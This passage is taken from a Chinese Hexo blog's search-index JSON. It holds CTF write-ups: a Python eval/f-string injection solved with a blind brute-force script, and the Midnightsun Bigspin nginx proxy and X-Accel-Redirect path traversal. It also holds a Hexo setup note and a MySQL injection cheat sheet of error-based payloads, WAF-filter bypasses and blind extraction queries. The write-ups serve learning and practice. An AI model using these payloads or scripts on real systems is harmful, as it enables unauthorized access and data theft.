class=\"string\">&#x27;=&#x27;</span>,<span class=\"string\">&#x27;!&#x27;</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> val == <span class=\"string\">&#x27;&#x27;</span> <span class=\"keyword\">or</span> val[<span class=\"number\">0</span>] <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> list_ops:</span><br><span class=\"line\">            print(<span class=\"string\">&#x27;&lt;center&gt;Invalid op&lt;/center&gt;&#x27;</span>)</span><br><span class=\"line\">            sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> val</span><br><span class=\"line\">    </span><br><span class=\"line\">    op = get_op(get_value(arguments[<span class=\"string\">&#x27;op&#x27;</span>].value))</span><br><span class=\"line\">    value1 = get_value(arguments[<span class=\"string\">&#x27;value1&#x27;</span>].value)</span><br><span class=\"line\">    value2 = get_value(arguments[<span class=\"string\">&#x27;value2&#x27;</span>].value)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> str(value1).isdigit() ^ str(value2).isdigit():</span><br><span class=\"line\">        print(<span class=\"string\">&#x27;&lt;center&gt;Types of the values don\\&#x27;t match&lt;/center&gt;&#x27;</span>)</span><br><span class=\"line\">        sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))</span><br><span class=\"line\">    </span><br><span class=\"line\">    print(<span class=\"string\">&#x27;&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class=&quot;col-md-8&quot;&gt;&lt;pre&gt;&#x27;</span>)</span><br><span class=\"line\">    print(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt; print(&#x27;</span>+escape(calc_eval)+<span class=\"string\">&#x27;)&#x27;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        result = str(eval(calc_eval))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> result.isdigit() <span class=\"keyword\">or</span> result == <span class=\"string\">&#x27;True&#x27;</span> <span class=\"keyword\">or</span> result == <span class=\"string\">&#x27;False&#x27;</span>:</span><br><span class=\"line\">            print(result)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">&quot;Invalid&quot;</span>) <span class=\"comment\"># Sorry we don&#x27;t support output as a string due to security issue.</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">&quot;Invalid&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    print(<span class=\"string\">&#x27;&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br></pre></td></tr></table></figure></p>\r\n<p>op 也会被 blacklist 过滤一遍，不能使用’了，目前也没有什么好用的方法继续绕过了。注意到一件事，题目用的 Python 版本为 Python3，会不会有什么特别的功能了？确实有，<a href=\"https://www.python.org/dev/peps/pep-0498/\">f-string</a>。f-string 里可以引入判断，所以思路要换一下：Tru 通过 value1 输出，而 e 通过条件判断。就是要构造 f’{FLAG&gt;source or “e” }’，当 FLAG&gt;source 时输出 1，否则输出 e。那么脚本就很好写了，稍微改一下： <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">url=<span class=\"string\">&quot;http://192.168.60.131/cgi-bin/py.py?source=&#123;0&#125;&amp;value1=&#123;1&#125;&amp;op=&#123;2&#125;&amp;value2=&#123;3&#125;&quot;</span></span><br><span class=\"line\">flag=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">source=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">value1=urllib.parse.quote(<span class=\"string\">&quot;T&quot;</span>)</span><br><span class=\"line\">op=urllib.parse.quote(<span class=\"string\">&quot;+f&quot;</span>)</span><br><span class=\"line\">value2=urllib.parse.quote(<span class=\"string\">&quot;ru&#123;FLAG&gt;source or 14:x&#125;&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    prev = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">255</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> chr(i) <span class=\"keyword\">in</span> string.printable:</span><br><span class=\"line\">            source=flag+chr(prev)</span><br><span class=\"line\">            source=urllib.parse.quote(source)</span><br><span class=\"line\">            result=requests.get(url.format(source,value1,op,value2)).text</span><br><span class=\"line\">            <span class=\"comment\">#print(result)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&quot;True&quot;</span> <span class=\"keyword\">in</span> result <span class=\"keyword\">and</span> <span class=\"string\">&quot;security&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> result:</span><br><span class=\"line\">                flag+=chr(prev<span class=\"number\">-1</span>)</span><br><span class=\"line\">                print(flag)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                prev=i</span><br></pre></td></tr></table></figure></p>\r\n\n    <div id=\"aplayer-BhLnzkIL\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"30064351\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{5b6e26f3-ad46-4165-9f55-7766c3bb2fff}</p>\r\n","categories":["Writeups"],"tags":["Web","f-string"]},{"title":"Midnightsun-Bigspin","url":"/2019/08/20/Midnightsun-Bigspin/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>放假各种摸鱼，今天来个不一样的Web题。Midnightsun 2019 Quals CTF的Bigspin。</p>\r\n<h1 id=\"part-1.代理\">Part 1.代理</h1>\r\n<a id=\"more\"></a>\r\n<p>打开页面后很直接，给了四个链接：<code>uberadmin</code>、<code>admin</code>、<code>user</code>和<code>pleb</code>，点进去发现<code>uberadmin</code> 403、<code>admin</code> 404、<code>user</code> 403、<code>pleb</code>对应一个Example Domain的页面（后来发现是一个叫做https://www.example.com的网站）。开始以为会是从pleb下手，然后发现各种链接返回同样的内容。</p>\r\n<p>看一下HTTP响应头，Web服务器为Nginx，可能会出现路径穿越问题。访问http://xxx.xxx.xxx.xxx/pleb../，发现返回了个502 Bad Gateway？这就有意思了。正常情况下的路径穿越只会返回200或者404，502是什么东西？Google到这个<a href=\"https://www.keycdn.com/support/502-bad-gateway\">东西</a>，上面提到三条原因，其中第一个Domain name not resolvable有点意思，这让我们猜测/pleb/下有一个代理。/pleb../返回502的原因猜测为没有<code>www.example.com../</code>这个域名，因为它确实不合法。</p>\r\n<p>那么我们现在的想法是：通过某种方式，将代理指向题目服务器（127.0.0.1），访问。</p>\r\n<p>然后就到重点了，确实有这种网站，能将任意DNS域名转为IP域名：<code>https://nip.io</code>。我们来测试一下：访问http://xxx.xxx.xxx.xxx/pleb-yyy.yyy.yyy.yyy.nip.io/</p>\r\n<img src=\"/2019/08/20/Midnightsun-Bigspin/Successful_proxy_server.png\" class=\"\" title=\"Successfully proxy to other server\">\r\n<p>那么我们试一下最开始无法打开的uberadmin等路径：</p>\r\n<img src=\"/2019/08/20/Midnightsun-Bigspin/user_folder.png\" class=\"\" title=\"user路径下存在文件\">\r\n<h1 id=\"part-2.nginx配置\">Part 2.Nginx配置</h1>\r\n<p>user目录下有一个nginx.cönf文件，我们没办法直接打开。Nginx对于Unicode字符支持不是很好，我们可以通过两次URL编码打开文件。即访问<code>http://127.0.0.1:5631/pleb.127.0.0.1.nip.io/user/nginx.c%25c3%25b6nf</code>，可以得到nginx的配置文件。</p>\r\n<figure class=\"highlight nginx\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">events</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">worker_connections</span>  <span class=\"number\">1024</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">http</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">resolver</span> <span class=\"number\">8.8.8.8</span> ipv6=<span class=\"literal\">off</span>;</span><br><span class=\"line\">    <span class=\"section\">server</span> &#123;</span><br><span class=\"line\">        <span class=\"attribute\">listen</span> <span class=\"number\">80</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"attribute\">location</span> / &#123;</span><br><span class=\"line\">            <span class=\"attribute\">root</span> /var/www/html/public;</span><br><span class=\"line\">            <span class=\"attribute\">try_files</span> <span class=\"variable\">$uri</span>  <span class=\"variable\">$uri</span>/index.html <span class=\"variable\">$uri</span>/ =<span class=\"number\">404</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"attribute\">location</span> /user &#123;</span><br><span class=\"line\">            <span class=\"attribute\">allow</span> <span class=\"number\">127.0.0.1</span>;</span><br><span class=\"line\">            <span class=\"attribute\">deny</span> all;</span><br><span class=\"line\">            <span class=\"attribute\">autoindex</span> <span class=\"literal\">on</span>;</span><br><span class=\"line\">            <span class=\"attribute\">root</span> /var/www/html;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"attribute\">location</span> /admin &#123;</span><br><span class=\"line\">            internal;</span><br><span class=\"line\">            <span class=\"attribute\">autoindex</span> <span class=\"literal\">on</span>;</span><br><span class=\"line\">            <span class=\"attribute\">alias</span> /var/www/html/admin/;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"attribute\">location</span> /uberadmin &#123;</span><br><span class=\"line\">            <span class=\"attribute\">allow</span>  <span class=\"number\">13.3.7.233</span>;</span><br><span class=\"line\">            <span class=\"attribute\">deny</span> all;</span><br><span class=\"line\">            <span class=\"attribute\">autoindex</span> <span class=\"literal\">on</span>;</span><br><span class=\"line\">            <span class=\"attribute\">alias</span> /var/www/html/uberadmin;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"attribute\">location</span> <span class=\"regexp\">~ /pleb([/a-zA-Z0-9.:%]+)</span> &#123;</span><br><span class=\"line\">            <span class=\"attribute\">proxy_pass</span> http://example.com<span class=\"variable\">$1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n<p>uberadmin只允许IP为13.3.7.233访问，暂时没法绕过。而admin有个很有趣的internal选项。找到<a href=\"http://nginx.org/en/docs/http/ngx_http_core_module.html#internal\">文档</a>，其中一条特别有意思：requests redirected by the “X-Accel-Redirect” response header field from an upstream server;就是说如果远程服务器发送了X-Accel-Redirect头，nginx会将其认为是internal访问进行跳转。</p>\r\n<p>那么思路就很明确了：远程服务器发送HTTP头请求，题目接受并跳转即可。PHP就可以了。</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">header(<span class=\"string\">&quot;X-Accel-Redirect: /admin/&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n<p>放到远程服务器上，然后在题目端访问就可以列admin目录内容了。</p>\r\n<img src=\"/2019/08/20/Midnightsun-Bigspin/admin_folder.png\" class=\"\" title=\"列admin目录\">\r\n<p>但是我们没法直接打开，需要修改服务器的PHP文件才能访问。然后我们得到了个假flag提示uberadmin下有真正的flag。</p>\r\n<p>uberadmin仅允许特定IP访问，没法直接访问到，但是注意看nginx文件的写法：/admin，而不是/admin/，存在路径穿越。因此改路径成/admin../uberadmin/flag.txt即可拿到真正的flag。</p>\r\n\n    <div id=\"aplayer-HEoMrBiK\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"500696\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{e92273c1-52fc-47c5-a6f4-10a1b6577ce7}</p>\r\n","categories":["Writeups"],"tags":["Web","Nginx","nip.io"]},{"title":"MyHexo","url":"/2019/08/22/MyHexo/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>记录一下用Hexo以来踩过的坑。</p>\r\n<h1 id=\"插件\">插件</h1>\r\n<p>用到的插件有：</p>\r\n<ul>\r\n<li>hexo-tag-aplayer</li>\r\n<li>hexo-word-count</li>\r\n<li>hexo-blog-encrypt（配置了加密的博文和aplayer冲突）</li>\r\n<li>hexo-related-popular-posts</li>\r\n<li>hexo-generator-json-content（icarus主题的insight搜索）</li>\r\n<li>hexo-filter-mathjax</li>\r\n<li>hexo-renderer-pandoc</li>\r\n<li>hexo-generator-searchdb</li>\r\n<li>theme-next/theme-next-calendar（日历）</li>\r\n<li>theme-next/hexo-next-share（分享按钮）</li>\r\n<li>theme-next/hexo-next-title（窗口失去焦点后换标题）</li>\r\n<li>theme-next/hexo-next-coauthor（副作者）</li>\r\n<li>theme-next/hexo-filter-emoji（Github表情）</li>\r\n</ul>\r\n<h1 id=\"next\">Next</h1>\r\n<p>我比较喜欢大而全的主题，所以用的Next。然后，没事不要轻易升级next。要升也是大版本升级。next的github那里基本上没有认真验证能否跑通的。</p>\r\n<h1 id=\"延迟\">延迟</h1>\r\n<p>github和tencent的平台有延迟，基本上要等5分钟左右再去访问。</p>\r\n<h1 id=\"section\">&amp; &lt; &gt;</h1>\r\n<p>Hexo博文的标题不能出现“&amp;”、“&lt;”、“&gt;”这些字符。否则local-search会没法用。</p>\r\n\n    <div id=\"aplayer-jDTiNUoT\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"18803200\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{9e047d10-c4c0-11e9-a2e4-1914e95dcfd8}</p>\r\n","categories":["Misc"],"tags":["Hexo"]},{"title":"MySQL注入总结","url":"/2020/08/24/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h1 id=\"or-and被过滤\">or and被过滤</h1>\n<p>用|| &amp;&amp;代替</p>\n<h1 id=\"union-select-被过滤\">union select 被过滤</h1>\n<p>用/*!union*/ /*!select*/代替</p>\n<h1 id=\"空格被过滤\">空格被过滤</h1>\n<p>用/%0a/，或者()。</p>\n<h1 id=\"逗号被过滤\">逗号被过滤</h1>\n<p>if换成select case when，substring改用substring( from 1 for 1)</p>\n<h1 id=\"报错注入\">报错注入</h1>\n<p>1.floor()</p>\n<p>select * from test where id=1 and (select 1 from (select count(<em>),concat(user(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);</p>\n<figure>\n<img src=\"https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928204840594-1429421338.png\" alt=\"img\" /><figcaption aria-hidden=\"true\">img</figcaption>\n</figure>\n<p>2.extractvalue()</p>\n<p>select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</p>\n<figure>\n<img src=\"https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205421297-407989251.png\" alt=\"img\" /><figcaption aria-hidden=\"true\">img</figcaption>\n</figure>\n<p>3.updatexml()</p>\n<p>select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</p>\n<figure>\n<img src=\"https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205451969-1920882857.png\" alt=\"img\" /><figcaption aria-hidden=\"true\">img</figcaption>\n</figure>\n<p>4.geometrycollection()</p>\n<p>select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</p>\n<figure>\n<img src=\"https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205719485-521701933.png\" alt=\"img\" /><figcaption aria-hidden=\"true\">img</figcaption>\n</figure>\n<p>5.multipoint()</p>\n<p>select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</p>\n<figure>\n<img src=\"https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205942266-563740245.png\" alt=\"img\" /><figcaption aria-hidden=\"true\">img</figcaption>\n</figure>\n<p>6.polygon()</p>\n<p>select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</p>\n<figure>\n<img src=\"https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205828281-760176387.png\" alt=\"img\" /><figcaption aria-hidden=\"true\">img</figcaption>\n</figure>\n<p>7.multipolygon()</p>\n<p>select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</p>\n<figure>\n<img src=\"https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928210038094-1420034123.png\" alt=\"img\" /><figcaption aria-hidden=\"true\">img</figcaption>\n</figure>\n<p>8.linestring()</p>\n<p>select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</p>\n<figure>\n<img src=\"https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928210144438-1099086559.png\" alt=\"img\" /><figcaption aria-hidden=\"true\">img</figcaption>\n</figure>\n<p>9.multilinestring()</p>\n<p>select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</p>\n<figure>\n<img src=\"https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928210420750-344279412.png\" alt=\"img\" /><figcaption aria-hidden=\"true\">img</figcaption>\n</figure>\n<p>10.exp()</p>\n<p>select * from test where id=1 and exp(~(select * from(select user())a));</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">PHP filter code: preg_match(&#39;&#x2F;(and|or)&#x2F;i&#39;,$id);</span><br><span class=\"line\">Bypass: 1||1    1&amp;&amp;1</span><br><span class=\"line\"></span><br><span class=\"line\">PHP filter code: preg_match(&#39;&#x2F;(and|or|union)&#x2F;i&#39;, $id);</span><br><span class=\"line\">Payload: union select user, password from users</span><br><span class=\"line\">Bypass:  1 || (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;, $id)</span><br><span class=\"line\">Payload: 1 || (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class=\"line\">Bypass:  1 || (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit)&#x2F;i&#39;, $id)</span><br><span class=\"line\">Payload: 1 || (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class=\"line\">Bypass:  1 || (select user from users group by user_id having user_id&#x3D;1) &#x3D; &#39;admin&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by)&#x2F;i&#39;, $id)</span><br><span class=\"line\">Payload: 1 || (select user from users group by user_id having user_id&#x3D;1) &#x3D; &#39;admin&#39;</span><br><span class=\"line\">Bypass:  1 || (select substr(group_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class=\"line\"></span><br><span class=\"line\">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select)&#x2F;i&#39;, $id)</span><br><span class=\"line\">Payload: 1 || (select substr(group_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class=\"line\">Bypass:  1 || 1&#x3D;1 into outfile &#39;result.txt&#39;</span><br><span class=\"line\">Bypass:  1 || substr(user,1,1)&#x3D;&#39;a&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\\&#39;)&#x2F;i&#39;, $id)</span><br><span class=\"line\">Payload: 1 || (select substr(gruop_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class=\"line\">Bypass:  1 || user_id is not null</span><br><span class=\"line\">Bypass:  1 || substr(user,1,1) &#x3D; 0x61</span><br><span class=\"line\">Bypass:  1 || substr(user,1,1) &#x3D; unhex(61)</span><br><span class=\"line\"></span><br><span class=\"line\">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\\&#39;|hex)&#x2F;i&#39;, $id)</span><br><span class=\"line\">Payload: 1 || substr(user,1,1) &#x3D; unhex(61)</span><br><span class=\"line\">Bypass:  1 || substr(user,1,1) &#x3D; lower(conv(10,10,36))</span><br><span class=\"line\"></span><br><span class=\"line\">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\\&#39;|hex|substr)&#x2F;i&#39;, $id)</span><br><span class=\"line\">Payload: 1 || substr(user,1,1) &#x3D; lower(conv(11,10,36))</span><br><span class=\"line\">Bypass:  1 || lpad(user,7,1)</span><br><span class=\"line\"></span><br><span class=\"line\">PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\\&#39;|hex|substr|\\s)&#x2F;i&#39;, $id)</span><br><span class=\"line\">Payload: 1 || lpad(user, 7, 1)</span><br><span class=\"line\">Bypass:  1%0b||%0blpad(user,7,1)</span><br><span class=\"line\"></span><br><span class=\"line\">Bypass with comments</span><br><span class=\"line\">id&#x3D;1+un&#x2F;**&#x2F;ion+se&#x2F;**&#x2F;lect+1,2,3-- </span><br><span class=\"line\"></span><br><span class=\"line\">Bypass Regex Filter: &#x2F;union\\sselect&#x2F;g</span><br><span class=\"line\">1+UnIon&#x2F;**&#x2F;SeLecT&#x2F;**&#x2F;1,2,3-- </span><br><span class=\"line\"></span><br><span class=\"line\">Bypass preg_replace</span><br><span class=\"line\">1+UNunionION+SEselectLECT+1,2,3--</span><br><span class=\"line\"></span><br><span class=\"line\">If WAF use preg_replace to replace SQL keywords to whitespace</span><br><span class=\"line\">1+uni%0bon+se%0blect+1,2,3--</span><br><span class=\"line\"></span><br><span class=\"line\">For Mod_rewrite, &#x2F;**&#x2F; cannot bypassed. So we use %0b replace &#x2F;**&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">Double encode can bypass some waf</span><br><span class=\"line\">1%252f%252a*&#x2F;union%252f%252a &#x2F;select%252f%252a*&#x2F;1,2,3%252f%252a*&#x2F;from%252f%252a*&#x2F;users--</span><br><span class=\"line\"></span><br><span class=\"line\">e.g.</span><br><span class=\"line\">id&#x3D;0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user</span><br><span class=\"line\">%0D%0A as a newline</span><br><span class=\"line\">&#x3D;&#x3D;&gt;</span><br><span class=\"line\">0 div 1 union#foo&#x2F;**&#x2F;bar</span><br><span class=\"line\">select#foo</span><br><span class=\"line\">1,2,current</span><br><span class=\"line\"></span><br><span class=\"line\">Inline Comments</span><br><span class=\"line\">id&#x3D;1&#x2F;*!uNIon*&#x2F;SeLeCt+1,2,3-- </span><br><span class=\"line\">id&#x3D;&#x2F;*!UnIoN*&#x2F;+&#x2F;*!SeLecT*&#x2F;+1,2,concat(&#x2F;*!table_name*&#x2F;)+FrOm&#x2F;*!information_schema*&#x2F;.tables&#x2F;*!WhErE*&#x2F;+&#x2F;*!TaBlE_sChEMa*&#x2F;+like+database()--</span><br><span class=\"line\">id&#x3D;1&#x2F;*!50000union*&#x2F;&#x2F;*!50000select*&#x2F;</span><br></pre></td></tr></table></figure>\n<h1 id=\"时间盲注\">时间盲注</h1>\n<p>sleep benchmark</p>\n<h1 id=\"waf\">WAF</h1>\n<h2 id=\"section\">01</h2>\n$filter = \"/ |\\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\\||`|&|\".urldecode('%09').\"|\".urldecode(\"%0a\").\"|\".urldecode(\"%0b\").\"|\".urldecode('%0c').\"|\".urldecode('%0d').\"|\".urldecode('%a0').\"/i\";`\n<p>利用position/locate函数。 <figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> flag <span class=\"keyword\">from</span> flag <span class=\"keyword\">where</span> flag=<span class=\"string\">&#x27;admin&#x27;</span>&lt;(<span class=\"keyword\">position</span>(<span class=\"keyword\">hex</span>(<span class=\"string\">&#x27;%s&#x27;</span>)<span class=\"keyword\">in</span>(<span class=\"keyword\">hex</span>(passwd)))=<span class=\"number\">1</span>)^<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">select</span> flag <span class=\"keyword\">from</span> flag <span class=\"keyword\">where</span> flag=<span class=\"string\">&#x27;admin&#x27;</span>&lt;(<span class=\"keyword\">position</span>(<span class=\"keyword\">hex</span>(<span class=\"string\">&#x27;S&#x27;</span>)<span class=\"keyword\">in</span>(<span class=\"keyword\">hex</span>(passwd)))=<span class=\"number\">1</span>)^<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">select</span> flag <span class=\"keyword\">from</span> flag <span class=\"keyword\">where</span> flag=<span class=\"string\">&#x27;admin&#x27;</span>&lt;(<span class=\"keyword\">position</span>(<span class=\"keyword\">hex</span>(<span class=\"string\">&#x27;SY&#x27;</span>)<span class=\"keyword\">in</span>(<span class=\"keyword\">hex</span>(passwd)))=<span class=\"number\">1</span>)^<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">select</span> flag <span class=\"keyword\">from</span> flag <span class=\"keyword\">where</span> flag=<span class=\"string\">&#x27;admin&#x27;</span>&lt;(<span class=\"keyword\">position</span>(<span class=\"keyword\">hex</span>(<span class=\"string\">&#x27;SYN&#x27;</span>)<span class=\"keyword\">in</span>(<span class=\"keyword\">hex</span>(passwd)))=<span class=\"number\">1</span>)^<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">select</span> flag <span class=\"keyword\">from</span> flag <span class=\"keyword\">where</span> flag=<span class=\"string\">&#x27;admin&#x27;</span>&lt;(<span class=\"keyword\">hex</span>(<span class=\"keyword\">mid</span>((passwd)<span class=\"keyword\">from</span>(-%d)))=<span class=\"keyword\">hex</span>(<span class=\"string\">&#x27;%s&#x27;</span>))^<span class=\"string\">&#x27;</span></span><br><span class=\"line\"><span class=\"string\">select flag from flag where flag=&#x27;</span><span class=\"keyword\">admin</span><span class=\"string\">&#x27;&lt;(hex(mid((passwd)from(-1)))=hex(&#x27;</span>S<span class=\"string\">&#x27;))^&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">select</span> flag <span class=\"keyword\">from</span> flag <span class=\"keyword\">where</span> flag=<span class=\"string\">&#x27;admin&#x27;</span>&lt;(<span class=\"keyword\">hex</span>(<span class=\"keyword\">mid</span>((passwd)<span class=\"keyword\">from</span>(<span class=\"number\">-2</span>)))=<span class=\"keyword\">hex</span>(<span class=\"string\">&#x27;Y&#x27;</span>))^<span class=\"string\">&#x27;</span></span><br><span class=\"line\"><span class=\"string\">select flag from flag where flag=&#x27;</span><span class=\"keyword\">admin</span><span class=\"string\">&#x27;&lt;(hex(mid((passwd)from(-3)))=hex(&#x27;</span>N<span class=\"string\">&#x27;))^&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"section-1\">02</h2>\n$filter = 